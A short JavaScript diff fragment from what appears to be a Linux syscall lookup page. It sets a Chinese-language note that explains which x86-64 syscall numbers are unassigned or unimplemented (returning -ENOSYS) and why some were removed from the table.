+    $("tableNote").textContent="已按 x86-64 调用号表（syscall_64.tbl）复核：205 set_thread_area、211 get_thread_area、212 lookup_dcookie 在 amd64 上没有实现，调用只会返回 -ENOSYS，已从表中去掉（i386 上 205/211/212 是 getgroups32/getresgid32/chown32 等真实调用，243/244 才是 set/get_thread_area，不受影响）。没收录的号分两类：①未分配空号只有 337–423（共 87 个）；②有名无实现、调用只会返回 -ENOSYS 的 17 个：134 uselib、156 _sysctl、174 create_module、177 get_kernel_syms、178 query_module、180 nfsservctl、181 getpmsg、182 putpmsg、183 afs_syscall、184 tuxcall、185 security、205 set_thread_area、211 get_thread_area、212 lookup_dcookie、214 epoll_ctl_old、215 epoll_wait_old、236 vserver。注意 175=init_module、176=delete_module、179=quotactl 是真实可用的调用，335=uretprobe、336=uprobe 也是真实存在的新调用，都不是空号。找不到就换英文名再试。";
     var n64=$("i386Note"); if(n64){ n64.classList.remove("show"); n64.innerHTML=""; }
   }
   chain=[]; renderChain();
